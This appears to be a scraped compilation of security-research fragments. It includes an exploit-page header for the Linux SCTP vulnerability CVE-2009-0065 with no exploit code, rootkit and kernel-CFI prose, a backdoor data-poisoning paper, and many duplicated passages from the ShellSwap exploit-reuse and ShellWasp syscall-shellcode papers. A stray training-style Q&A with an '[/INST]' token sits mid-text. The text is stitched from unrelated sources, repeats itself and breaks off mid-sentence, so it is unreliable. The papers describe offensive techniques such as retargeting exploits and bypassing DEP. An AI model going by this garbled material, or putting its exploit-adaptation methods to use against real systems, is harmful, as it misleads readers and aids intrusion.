pages.n* * *  Published on:      2009-07-01 00:00:00 +0000 UTC Last modified:      2022-08-22 10:00:56 +0000 UTC  * * *    * __  Share by e-mail    * __  Share on Facebook    * __  Share on Linkedin    * __  Share on Twitter  ## Background    * The vulnerability existed for quite some time in the SCTP implementation in the Linux kernel.   * Honoring the tradition of downplaying the severity of vulnerabilities, the Linux kernel maintainers pushed a decidedly deceptive narrative to the customer base of the kernel.   * The vulnerability was assigned CVE-2009-0065, after being disclosed on 01/07/2009 by sgrakkyu.   * Google Translate from \"Linux kernel security English\" to \"Plain English\" for \" **an unknown impact** \" turned out to be \" **arbitrary remote code execution in kernel context** \".   * Our resident exploit curator wrote what was possibly the longest remote Linux kernel exploit at the time. sgrakkyus targets were reused, and his version is absolutely worth reading (and his credentials as an excellent Linux kernel ab- researcher are well established).   * That exploit in redacted form (one information leak technique removed, besides other minor edits) is now listed in this page for your amusement, dear reader.

Many of the techniques discussed thusfar have involved hooking, or redirecting, the execution flow of a normal systemoperation (such as how the system processes file I/O) by abusing mechanisms in placeto achieve the operation. DKOM is capable of achieving the same effects of hooking,detouring, and many of the techniques previously discussed, but without having tofigure out where the rootkit needs to insert itself in the execution flow.Rather, DKOM directly modifies kernel objects in memory that are used by the kerneland the Executive during this execution flow.n\u201cReturn-oriented programming: Systems, languages, and applications,\u201d ACM Transactions on Information and System Security , vol. 15, no. 1, 2:1\u20132:34, 2012.

Control-flow integrity is hard to get right at the best of times, and even harder still in kernel-space. This presentation shows that kCFI (even when hardware-assisted) doesnt work when code pages can be rearranged with an arbitrary read/write vulnerability. Its a little bit theoretical in terms of impact because the kCFI they use is \"FineIBT\", which I dont think is widely used yet.      Anyway, this kind of thing is exactly why Apple has spent a lot of time building KTRR/CTRR (ed: not PPL like this post originally included) for iOS, which is the most robust approach to preventing this stuff that I know of. Windows currently has Kernel Data Protection (KDP) and they seem to be early adopters of Intels HLAT, so they should be OK once thats available on more devices and they enable it by default. The Android situation is a bit more concerning, but at least Samsungs Knox is trying.      * \"Make KSMA Great Again: The Art of Rooting Android Devices by GPU MMU Features\" by Yong Wang. A deep dive into the MMU internals of ARMs Mali GPU, and a detailed discussion of one of the many recent vulnerabilities in the Mali driver (although I cant find the CVE for the issue, it was fixed here). Their observation is that with a sufficiently powerful vulnerability you can use a similar exploit technique to Kernel Space Mirroring Attacks (KSMA)/ret2dir, but using the GPUs MMU instead. Essentially you end up with a GPU memory mapping that is aliased to the CPU for arbitrary physical pages.n* * *  Published on:      2009-07-01 00:00:00 +0000 UTC Last modified:      2022-08-22 10:00:56 +0000 UTC  * * *    * __  Share by e-mail    * __  Share on Facebook    * __  Share on Linkedin    * __  Share on Twitter  ## Background    * The vulnerability existed for quite some time in the SCTP implementation in the Linux kernel.   * Honoring the tradition of downplaying the severity of vulnerabilities, the Linux kernel maintainers pushed a decidedly deceptive narrative to the customer base of the kernel.   * The vulnerability was assigned CVE-2009-0065, after being disclosed on 01/07/2009 by sgrakkyu.   * Google Translate from \"Linux kernel security English\" to \"Plain English\" for \" **an unknown impact** \" turned out to be \" **arbitrary remote code execution in kernel context** \".   * Our resident exploit curator wrote what was possibly the longest remote Linux kernel exploit at the time. sgrakkyus targets were reused, and his version is absolutely worth reading (and his credentials as an excellent Linux kernel ab- researcher are well established).   * That exploit in redacted form (one information leak technique removed, besides other minor edits) is now listed in this page for your amusement, dear reader.

Many of the techniques discussed thusfar have involved hooking, or redirecting, the execution flow of a normal systemoperation (such as how the system processes file I/O) by abusing mechanisms in placeto achieve the operation. DKOM is capable of achieving the same effects of hooking,detouring, and many of the techniques previously discussed, but without having tofigure out where the rootkit needs to insert itself in the execution flow.Rather, DKOM directly modifies kernel objects in memory that are used by the kerneland the Executive during this execution flow.n\u201cReturn-oriented programming: Systems, languages, and applications,\u201d ACM Transactions on Information and System Security , vol. 15, no. 1, 2:1\u20132:34, 2012.

To tackle the above drawbacks, in this paper, we propose Stand-in Backdoor, a more stealthy and powerful backdoor attack, which can completely hide the trigger and maintain the correct labels of poisoned data. Speci\ufb01cally, we \ufb01rst design l\u221e-Mapping method to \ufb01nd the closest source sample and tar- get sample pairs in the feature space, to facilitate the following optimization. Subsequently, we propose a novel optimization strategy, called Feature Similarity Optimization, which based on the feature representation and structural similarity of the original data, to generate poisoned data with imperceptible perturbations and clean labels. Finally, utilizing the transfer- ability of feature perturbations, we \ufb01ne-tune the victim model with the well-constructed poisoned data. Together, our attack can reach 83.1% success rate for binary classi\ufb01cations with a negligible sacri\ufb01ce to the victim model\u2019s utility, meanwhile, retaining over 96% similarity between the origin samples and poisoned samples. In short, we summarized our contributions as follows. \u2022We design a more stealthy and powerful backdoor attack, which can completely hide the triggers while maintainingnimage classi\ufb01cation. Unfortunately, training DL models from scratch requires a plethora of available resources, which is almost unbearable for resource-constrained users. Hence, it is typically done to apply pre-trained models provided by third- parties and then \ufb01ne-tune them for speci\ufb01c tasks. Although this approach has achieved success in many applications, we argue that it\u2019s inherently vulnerable to Backdoor Attack [4], which can cause severe security consequences. Generally, by injecting poisoned data in the training process, the backdoor attack aims at making the victim model behave normally on the clean inputs, but maliciously on backdoored ones in the inferencing process, which is to classify them into a speci\ufb01c target class. Poisoned data can be constructed by tamping a \u201ctrigger\u201d (a minor patch) onto original data. Existing backdoor attacks can be divided into two cate- gories. The \ufb01rst one is Label Flipping Attack (LFA) where the original labels(true labels) of poisoned data will be modi\ufb01ed. In [5], Chen et al. presented a LFA, which injects the trigger by blending physical objects with benign images, at the same time, changing the origin labels to the target label. In [6], the authors utilized structural noises poisoning the training dataon the premise of label \ufb02ipping, to increase the invisibility of the triggers. All of the above works can be easily detected by manual inspection. The other one is Clean-Label Attack (CLA) where the labels of poisoned data keep correctly throughout the whole training process. Shafahi et al. proposed the \ufb01rst CLA [7], where a naive optimization method is designed to generate poisoned samples and further perturb target training data, while ensuring the label is unchanged.

We also use nML but enhance it in several ways in order  to generate efficient simulators for any kind of instruction  set.  An nML description is made of three parts as shown in    next textbox. The first part describes the state of the  system (memory and registers). The second part describes the addressing modes in order to avoid describing them several times in the instructions which use them. The third part is the description of the instructions themselves.  Instructions can be grouped into groups and part of their  description can be described once.  Op introduces an instruction or a list of instructions  connected by an OR (|) operator. An instruction has three attributes: syntax, image and action which corresponds  respectively to the assembler syntax, the binary image and  the code corresponding to the execution of the instruction  The nML grammar builds a tree to go through  instructions starting from conjunctions (AND) and disjunctions (OR) relationships. In nML, OR is represented  by | and AND by type or addressing mode encapsulation in  the parameters.

Meditor [26] provides a novel algorithm that \ufb02exibly locates and groups MR (migration-related) code changes in commits. For edit application, Meditor matches a given program with inferred edits to decide which edit is applicable and produce a migrated version for developers. AppEvolve [28] can automatically perform app updates for API changes based on examples of how other developers evolved their apps for the same changes.

We can see that the overhead introduced by OPKH is minimal. In general, these overhead relies on the frequ-ency of the interaction between the kernel module and OS kernel. If the benchmark itself involves lots of interaction, the extra overhead introduced by our protection will be a little bit higher. On the other hand, if the benchmark involves less interaction, the added-on over-head by our system could be negligible. In th-ese application benchmarks, the maximum overhead added by OPKH is 2.25% when we perform the kernel d ecompression.

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous. With the help of remote exploits against a piece of software running on a victim computer, an attacker can install backdoors and ex\ufb01ltrate sensitive information without physical access to thenthat is not currently possible. Third, the extension of ShellSwap to the ROP chain transplant problem would be an interesting future direction. Related work in the \ufb01eld of automatic ROP payload generation can be leveraged toward this end [ 27,29]. Finally, ShellSwapcan be expanded to support the generation of shellcode that is semantically equivalent to the replacement shellcode while having different contents to satisfy path constraints. Such shellcode polymorphism would increase the cases in which ShellSwap can resolve path con\ufb02icts. For example, we could consider building up a dictionary of \u201cinstruction synonyms\u201d, or creating templates to interchangethe cases in which ShellSwap can resolve path con\ufb02icts. For example, we could consider building up a dictionary of \u201cinstruction synonyms\u201d, or creating templates to interchange instructions without changing the semantics. VIII. R ELATED WORK A. Automatic Exploit Generation An exploit is valuable to attackers only when it suits attack- ers\u2019 speci\ufb01c goal. The technique of automatically generating an exploit with a piece of shellcode is called automatic exploit generation (AEG) [ 7,11,20,27]. Those work are mostly based on dynamic symbolic execution. AEG is closely related to ShellSwap in the sense that they both take a vulnerable program and a piece of shellcode and generate a viable exploit. Helaan et al. [ 17] proposed how to place shellcode in memory: scan through the memory and \ufb01nd symbolic memory gaps that are big enough to hold the entire piece of shellcode. For each gap, they try to put shellcode at different offsets by constraining symbolic memory bytes beginning at that offset to the actual bytes of the shellcode. This procedure continues until the shellcode is put in a memory gap or all gaps have been tried. As we have demonstrated in our evaluation, AEG techniques are not suitable for shellcode transplanting, as they lack prin- cipled approach to diagnose and resolve con\ufb02icts imposed bynof attack types for intrusion detection systems using a machine learning algorithm,\u201d in 2018 IEEE fourth international conference on big data computing service and applications (BigDataService).

In this section, we explore the implications of these results, the limitations of the system, and the direction of our future work. A. Ethical Concerns ShellSwap raises the concern that it enables malicious attackers to quickly adapt exploits against unwitting victims on the internet. Unfortunately, such criticism can be applied to almost all security research. Similar to known techniques such as automatic exploit generation [ 7,12] or automatic patch-based exploit generation [ 11], the merit of the ShellSwap system and its solution of the shellcode transplant problem is to show the potential abilities of attackers and to highlight the possibility that one can automatically modify exploits to tailor attacks to custom requirements. Our hope is that, by showing that this is possible, ShellSwap will motivate new research into defenses against customized exploits. B. Limitation While ShellSwap makes fundamental contributions toward the solution of the shellcode transplant problem, there is still work left to be done. Here, we discuss speci\ufb01c weaknesses of the system that could be addressed by future work. 1) Other types of vulnerabilities: Our system focuses solely on control-\ufb02ow hijack vulnerabilities, and we do not address other vulnerability types, such as Information Leakage and Denial of Service (DoS). To consider these types of vulnerabilities, as well as other popular types, the shellcode transplant problem would need to be rede\ufb01ned, as shellcode is not utilized in exploits targeting these vulnerabilities. Thus, to generalize ShellSwap, we must \ufb01rst de\ufb01ne the analogous problem in the context of a different vulnerabilities, and then discuss possible designs to solve it. We de\ufb01ne the analogous problem for information leakage vulnerabilities as the generation of a modi\ufb01ed exploit that leaks adifferent piece of data (whether a memory location, a \ufb01le,nis hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations. In fact, as we show in our evaluation, less than a third of the original exploits in our dataset can be modi\ufb01ed by existing techniques. In this paper, we present ShellSwap , an automated system that addresses the shellcode transplant problem . ShellSwap takes an existing exploit and a user-speci\ufb01ed replacement shellcode as input and produces a modi\ufb01ed exploit that 2017 IEEE Symposium on Security and Privacy \u00a9 2017, Tiffany Bao.

ShellSwap tackles the challenges discussed above with a mix of symbolic execution and static analysis techniques, applying novel techniques to identify the original shellcode, recover the data transformation performed on it, and resolve any con\ufb02icts introduced by the transplant of the replacement shellcode. By utilizing information obtained from the original exploit and creatively transforming the replacement shellcode, ShellSwap rarely degrades to a pure symbolic exploration, and is thus more ef\ufb01cient and effective compared to previous solutions.Additionally, the use of carefully-designed systematic approaches enables ShellSwap to transplant more shellcode variants. In our experiment, ShellSwap successfully generates new exploits for 88% of all cases, which is almost three times the success rate of prior techniques. To the best of our knowledge, ShellSwap is the \ufb01rst automated system that modi\ufb01es exploits based on shellcode provided by analysts.

In this section, we explore the implications of these results, the limitations of the system, and the direction of our future work. A. Ethical Concerns ShellSwap raises the concern that it enables malicious attackers to quickly adapt exploits against unwitting victims on the internet. Unfortunately, such criticism can be applied to almost all security research. Similar to known techniques such as automatic exploit generation [ 7,12] or automatic patch-based exploit generation [ 11], the merit of the ShellSwap system and its solution of the shellcode transplant problem is to show the potential abilities of attackers and to highlight the possibility that one can automatically modify exploits to tailor attacks to custom requirements. Our hope is that, by showing that this is possible, ShellSwap will motivate new research into defenses against customized exploits. B. Limitation While ShellSwap makes fundamental contributions toward the solution of the shellcode transplant problem, there is still work left to be done. Here, we discuss speci\ufb01c weaknesses of the system that could be addressed by future work. 1) Other types of vulnerabilities: Our system focuses solely on control-\ufb02ow hijack vulnerabilities, and we do not address other vulnerability types, such as Information Leakage and Denial of Service (DoS). To consider these types of vulnerabilities, as well as other popular types, the shellcode transplant problem would need to be rede\ufb01ned, as shellcode is not utilized in exploits targeting these vulnerabilities. Thus, to generalize ShellSwap, we must \ufb01rst de\ufb01ne the analogous problem in the context of a different vulnerabilities, and then discuss possible designs to solve it. We de\ufb01ne the analogous problem for information leakage vulnerabilities as the generation of a modi\ufb01ed exploit that leaks adifferent piece of data (whether a memory location, a \ufb01le,nis hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations. In fact, as we show in our evaluation, less than a third of the original exploits in our dataset can be modi\ufb01ed by existing techniques. In this paper, we present ShellSwap , an automated system that addresses the shellcode transplant problem . ShellSwap takes an existing exploit and a user-speci\ufb01ed replacement shellcode as input and produces a modi\ufb01ed exploit that 2017 IEEE Symposium on Security and Privacy \u00a9 2017, Tiffany Bao.

Restrictions apply.targets the same vulnerability as the original exploit does but executes the replacement shellcode after exploitation. ShellSwap tackles the challenges discussed above with a mix of symbolic execution and static analysis techniques, applying novel techniques to identify the original shellcode, recover the data transformation performed on it, and resolve any con\ufb02icts introduced by the transplant of the replacement shellcode. By utilizing information obtained from the original exploit and creatively transforming the replacement shellcode, ShellSwap rarely degrades to a pure symbolic exploration, and is thus more ef\ufb01cient and effective compared to previous solutions.Additionally, the use of carefully-designed systematic approaches enables ShellSwap to transplant more shellcode variants. In our experiment, ShellSwap successfully generates new exploits for 88% of all cases, which is almost three times the success rate of prior techniques. To the best of our knowledge, ShellSwap is the \ufb01rst automated system that modi\ufb01es exploits based on shellcode provided by analysts. In terms of offense, ShellSwap greatly reduces the overhead in attack re\ufb02ection, which enables prompt responses to security incidents like 0-day attacks, especiallyn\"                   Question: 'What is a shellcode transplant and Why are automated shellcode placement methods insuffi- cient?[/INST] A shellcode transplant refers to the process of replacing the original shellcode in an existing exploit with a new shellcode to carry out specific actions desired by the attacker instead of the original exploit author. Automated shellcode placement methods are insufficient for shellcode transplant because they over-constrain the replacement shellcode and require the execution path of the modified exploit to be the same as the original one. These methods treat the shellcode as an integrated memory chunk, making it difficult to achieve shellcode transplant. To address these issues, researchers presented ShellSwap, a system that uses symbolic tracing, along with shellcode layout remediation and path kneading techniques, to enable shellcode transplant."}

When providing them as input, it is case insensitive. It can be desirable at times to have the same syscall used more than once, and ShellWasp supports doing so. To save space and avoid redundancy, however, it will only initialize each once in the syscall array. Thus, if a syscall is used three times in the shellcode, it will only have one element in the syscall array. ShellWasp is intended to be highly flexible, so users can easily rearrange the order of syscalls, using the rear- range feature. It only takes seconds to rearrange the order of syscalls. Similarly, specific Windows releases can quickly be added or removed in seconds. ShellWasp allows users to save their currentnsubsequent functions \u2013 be it WinAPI calls or syscalls.

With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated.

ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values.

As organizations such as the National Security Agency are commonly known to be stockpiling caches of vulnerabilities, such a capability can greatly reduce the overhead in using weapons from this cache. ShellSwap is also helpful in defense, where it can be used to debug exploits discovered in the wild (i.e. by transplanting a piece of shellcode that is benign or implements monitoring and reporting functionality) and rediscover vulnerabilities being exploited.

Our system shows that the automatic exploit reuse is possible: even a person who has little understandings about security vulnerabilities can retro\ufb01t an exploit for their custom use-case. \u2022We propose novel, systematic approaches to utilize in- formation from the original exploit to prevent ShellSwap from degenerating to inef\ufb01cient symbolic exploration, and revise the replacement shellcode without changing its semantics to \ufb01t constraints implicit to the original exploit. Those approaches are essential to the performance of ShellSwap. \u2022We evaluate our system on 100 cases \u2014 20 original exploits, each with 5 different pieces of shellcode. Our system successfully generates modi\ufb01ed exploits in 88% of our test set, and all new exploits work as expected. We also compare our system with the previous state of the art,nis hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations. In fact, as we show in our evaluation, less than a third of the original exploits in our dataset can be modi\ufb01ed by existing techniques. In this paper, we present ShellSwap , an automated system that addresses the shellcode transplant problem .

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous.

Config file and Customizing Syscalls. Users may supply desired syscalls in the config file, and they also may be provided as input in the command line interface, by typing one per name. When providing them as input, it is case insensitive. It can be desirable at times to have the same syscall used more than once, and ShellWasp supports doing so. To save space and avoid redundancy, however, it will only initialize each once in the syscall array. Thus, if a syscall is used three times in the shellcode, it will only have one element in the syscall array. ShellWasp is intended to be highly flexible, so users can easily rearrange the order of syscalls, using the rear- range feature. It only takes seconds to rearrange the order of syscalls. Similarly, specific Windows releases can quickly be added or removed in seconds. ShellWasp allows users to save their currentnsubsequent functions \u2013 be it WinAPI calls or syscalls. This requires the shellcode author to be aware of where in memory output may appear. With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated. Firstly, with Shell- Wasp, the tool, validation is achieved by showing the accuracy and correctness of the shellcode and Assembly it creates. Secondly, the case studies below provide validation, showing how ShellWasp can be used to create actual shellcode that uses multiple syscalls to achieve complex, malicious functionality. The tool itself additionally is an embodiment of a novel technique created by this research to overcome the portability problem with syscall shell- code, and that too can be used outside of the context of the tool; the case studies stand as evidence in support of this. Finally, this research has proposed a newnfor instance, has more than thirteen OS releases. This research provides a methodology to overcome the portability problem associated with shellcode. It also provides a methodology for how to utilize syscalls in shellcode. Finally, this research presents a new tool, ShellWasp, which builds templates of syscall shellcode. ShellWasp utilizes a novel syscall array, which can be populated at runtime with the correct SSNs, allowing syscall shellcode to be able to function across multiple OSs and OS releases. ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values. ShellWasp additionally labels all syscall parameters, making it easier for shellcode authors to understand how to construct syscall shellcode. Keywords: Shellcode, Windows syscalls, Reverse Engineering, Offensive Security Windows syscalls in shellcode have only been used on extremely rare occasions, with the singlenprecomputed syscall values, tailored to not every single Windows release in existence, but just the ones that the shellcode authors deem most likely to be used for a specific target, allowing the shellcode to achieve a vastly smaller size, than would otherwise need to be the case. Utilizing the PEB to identify the OS Build in ShellWasp naively was done through happenstance and looking closely at the members of the PEB structure, as described elsewhere here. Regardless, the PEB is how the first SysWhispers identified specific OS builds, though with 64-bit rather than 32-bit code. Once criticism leveled at SysWhispers was that it was too reliant on the syscall tables [4] created by another individual. While ShellWasp actually uses some syscall tables from the same source, we also are not reliant on it, in that we have created our own for new releases and plan to do so for all future OS builds that we decide to support. Moreover, we provide an alternative way to generate these \u2013 one fornprovided by analysts. In terms of offense, ShellSwap greatly reduces the overhead in attack re\ufb02ection, which enables prompt responses to security incidents like 0-day attacks, especially in a time-constrained, competitive scenario such as a hacking competition or cyber warfare. ShellSwap also makes it possible for entities to stockpile exploits in bulk, and tailor them to speci\ufb01c mission parameters before they are deployed at a later time. As organizations such as the National Security Agency are commonly known to be stockpiling caches of vulnerabilities, such a capability can greatly reduce the overhead in using weapons from this cache. ShellSwap is also helpful in defense, where it can be used to debug exploits discovered in the wild (i.e. by transplanting a piece of shellcode that is benign or implements monitoring and reporting functionality) and rediscover vulnerabilities being exploited. Speci\ufb01cally, our paper makes the following contributions: \u2022We design the ShellSwap system, which is the \ufb01rst end- to-end system that can modify an observed exploit and replace the original shellcode in it with an arbitrary re- placement shellcode. Our system shows that the automatic exploit reuse is possible: even a person who has little understandings about security vulnerabilities can retro\ufb01t an exploit for their custom use-case. \u2022We propose novel, systematic approaches to utilize in- formation from the original exploit to prevent ShellSwap from degenerating to inef\ufb01cient symbolic exploration, and revise the replacement shellcode without changing its semantics to \ufb01t constraints implicit to the original exploit. Those approaches are essential to the performance of ShellSwap. \u2022We evaluate our system on 100 cases \u2014 20 original exploits, each with 5 different pieces of shellcode. Our system successfully generates modi\ufb01ed exploits in 88% of our test set, and all new exploits work as expected. We also compare our system with the previous state of the art,nis hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations. In fact, as we show in our evaluation, less than a third of the original exploits in our dataset can be modi\ufb01ed by existing techniques. In this paper, we present ShellSwap , an automated system that addresses the shellcode transplant problem . ShellSwap takes an existing exploit and a user-speci\ufb01ed replacement shellcode as input and produces a modi\ufb01ed exploit that 2017 IEEE Symposium on Security and Privacy \u00a9 2017, Tiffany Bao.

Restrictions apply.targets the same vulnerability as the original exploit does but executes the replacement shellcode after exploitation. ShellSwap tackles the challenges discussed above with a mix of symbolic execution and static analysis techniques, applying novel techniques to identify the original shellcode, recover the data transformation performed on it, and resolve any con\ufb02icts introduced by the transplant of the replacement shellcode. By utilizing information obtained from the original exploit and creatively transforming the replacement shellcode, ShellSwap rarely degrades to a pure symbolic exploration, and is thus more ef\ufb01cient and effective compared to previous solutions.Additionally, the use of carefully-designed systematic approaches enables ShellSwap to transplant more shellcode variants. In our experiment, ShellSwap successfully generates new exploits for 88% of all cases, which is almost three times the success rate of prior techniques. To the best of our knowledge, ShellSwap is the \ufb01rst automated system that modi\ufb01es exploits based on shellcode provided by analysts. In terms of offense, ShellSwap greatly reduces the overhead in attack re\ufb02ection, which enables prompt responses to security incidents like 0-day attacks, especiallynsummarization.

Moreover, we provide an alternative way to generate these \u2013 one fornused purely as an exploit replaying system. 2) Exploit Replayabilty: ShellSwap assumes that the original exploit is deterministically replayable, in the sense that the exploit always succeeds when re-launched against the target. However, this assumption does not always hold. For instance, a vulnerable server may implement a challenge-response protocol that requires the client to send messages with a nonce that the two sides negotiated at the beginning of the session. This nonce would change when we replay the exploit, and the exploit would fail. Asymmetric encryption and sources of randomness from the environment can also manifest in such failures. To generate the modi\ufb01ed exploit for such case, ShellSwap would have to consider an exploit as a state machine rather than a series static bytes, which would require fundamental extensions of the design. This being said, our experiments showed that most of the exploits in our dataset are replayable, and our system is applicable for this majority. We intend to investigate the replaying of non-deterministic exploits in future work. 3) Modern Defense Mechanisms: Modern systems have memory protection mechanisms such as Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). However, such protection mechanisms can be bypassed by properly-crafted exploits. Our solution to the shellcode transplant problem is based on an functional original exploit, which implies that this exploit has already bypassed the required defense mechanisms. When this is the case, ShellSwap\u2019s replacement exploit often bypasses these mitigation techniques as well. For example, DEP is often bypassed through the use of Return Oriented Programming that chains pieces of code (termed gadgets )i na program to map an executable page (using the Linux mmap or DECREE allocate syscalls), insert shellcode into it, and execute it. Alternatively, the page containing the shellcode (for example, the program stack) can simply be marked executablen08048304 mov     eax, [ebp+var_24] 08048307 add     eax, 1 0804830C mov     [ebp+var_24], eax 0804830F jmp     loc_80482E608048314 mov     eax, [ebp+len] 08048317 mov     [ebp+ret], eax \u2026x01\u2026x01 Fig. 6: Part of the control \ufb02ow graph for the motivating example. nc\u2032. For the new path, the basic blocks do not change before nc\u2032or after nd. In between, we insert an intraprocedural path from nc\u2032tondG(nc\u2032,nd), which can be generated using the control graph of the function. In the best case, the question is equivalent to \ufb01nding a path between two nodes in a directed graph. However, it is possible that there is no such path to rejoin the original path, or that the problem reduces to symbolic exploration (if the divergence is too big). In this case, ShellSwap falls back on the Two-Stage Fallback. In the motivating example, as simply exiting the loop already rejoins the original path, the detour back to the path is trivial: it is the direct jump to the return site of the example function. After constructing the new path, the ShellSwap system generates the new exploitable program state and a new set of path constraints using the Symbolic Tracing step. Meanwhile, it also checks if the new program state is still exploitable. If the new program state is exploitable, our system starts again from the preprocessing phase to \ufb01t the replacement shellcode into the new exploitable program state. Otherwise, the system will attempt to construct the other paths and generate the other program states, falling back on the Two-Stage Fallback if it is unable to do so. D. Two-Stage Fallback If ShellSwap is unable to overcome the memory and path con\ufb02icts and \ufb01t the replacement shellcode into the exploitable state, then it falls back on pre-de\ufb01ned a two-stage shellcode instead of the provided replacement shellcode. The motivation of this fallback is straightforward: if the provided shellcode cannot \ufb01t the exploitable state, even after Path Kneading, wenAlthough it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace the path that the exploit runs on the program. We ensure tracingaccuracy in two ways: we record a dynamic trace of the exploit process (and require that our symbolic trace conform to the same instructions), and we pre-constrain the symbolic data to be equal to the original exploit. The former avoids the path explosion inherent in concolic execution exploration (because we only care about the branch that the exploit chooses), and the latter greatly simpli\ufb01es the job of the symbolic constraint solver during tracing (by providing it with a pre-determined solution). This method is similar to the pre-constraint tracing and the input pre-constraining approach proposed by Driller [ 30] (and, in fact, part of the implementation derives off of Driller\u2019s tracing module). The trace-directed symbolic execution takes a program and an original exploit and produces path constraints and the exploitable state. The exploitable state includes the symbolic value of registers and memory at the moment that the program starts to execute the shellcode. After this step completes,the pre-constraints introduced in the beginning are removed,making it possible to constrain some of the memory in the exploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program toexploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program to execute the same execution trace and triggers the vulnerability. IV .

ShellWasp utilizes a novel syscall array, which can be populated at runtime with the correct SSNs, allowing syscall shellcode to be able to function across multiple OSs and OS releases. ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values. ShellWasp additionally labels all syscall parameters, making it easier for shellcode authors to understand how to construct syscall shellcode. Keywords: Shellcode, Windows syscalls, Reverse Engineering, Offensive Security Windows syscalls in shellcode have only been used on extremely rare occasions, with the singlenprecomputed syscall values, tailored to not every single Windows release in existence, but just the ones that the shellcode authors deem most likely to be used for a specific target, allowing the shellcode to achieve a vastly smaller size, than would otherwise need to be the case. Utilizing the PEB to identify the OS Build in ShellWasp naively was done through happenstance and looking closely at the members of the PEB structure, as described elsewhere here. Regardless, the PEB is how the first SysWhispers identified specific OS builds, though with 64-bit rather than 32-bit code. Once criticism leveled at SysWhispers was that it was too reliant on the syscall tables [4] created by another individual. While ShellWasp actually uses some syscall tables from the same source, we also are not reliant on it, in that we have created our own for new releases and plan to do so for all future OS builds that we decide to support. Moreover, we provide an alternative way to generate these \u2013 one fornused purely as an exploit replaying system. 2) Exploit Replayabilty: ShellSwap assumes that the original exploit is deterministically replayable, in the sense that the exploit always succeeds when re-launched against the target. However, this assumption does not always hold. For instance, a vulnerable server may implement a challenge-response protocol that requires the client to send messages with a nonce that the two sides negotiated at the beginning of the session. This nonce would change when we replay the exploit, and the exploit would fail. Asymmetric encryption and sources of randomness from the environment can also manifest in such failures. To generate the modi\ufb01ed exploit for such case, ShellSwap would have to consider an exploit as a state machine rather than a series static bytes, which would require fundamental extensions of the design. This being said, our experiments showed that most of the exploits in our dataset are replayable, and our system is applicable for this majority. We intend to investigate the replaying of non-deterministic exploits in future work. 3) Modern Defense Mechanisms: Modern systems have memory protection mechanisms such as Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). However, such protection mechanisms can be bypassed by properly-crafted exploits. Our solution to the shellcode transplant problem is based on an functional original exploit, which implies that this exploit has already bypassed the required defense mechanisms. When this is the case, ShellSwap\u2019s replacement exploit often bypasses these mitigation techniques as well. For example, DEP is often bypassed through the use of Return Oriented Programming that chains pieces of code (termed gadgets )i na program to map an executable page (using the Linux mmap or DECREE allocate syscalls), insert shellcode into it, and execute it. Alternatively, the page containing the shellcode (for example, the program stack) can simply be marked executablen08048304 mov     eax, [ebp+var_24] 08048307 add     eax, 1 0804830C mov     [ebp+var_24], eax 0804830F jmp     loc_80482E608048314 mov     eax, [ebp+len] 08048317 mov     [ebp+ret], eax \u2026x01\u2026x01 Fig. 6: Part of the control \ufb02ow graph for the motivating example. nc\u2032. For the new path, the basic blocks do not change before nc\u2032or after nd. In between, we insert an intraprocedural path from nc\u2032tondG(nc\u2032,nd), which can be generated using the control graph of the function. In the best case, the question is equivalent to \ufb01nding a path between two nodes in a directed graph. However, it is possible that there is no such path to rejoin the original path, or that the problem reduces to symbolic exploration (if the divergence is too big). In this case, ShellSwap falls back on the Two-Stage Fallback. In the motivating example, as simply exiting the loop already rejoins the original path, the detour back to the path is trivial: it is the direct jump to the return site of the example function. After constructing the new path, the ShellSwap system generates the new exploitable program state and a new set of path constraints using the Symbolic Tracing step. Meanwhile, it also checks if the new program state is still exploitable. If 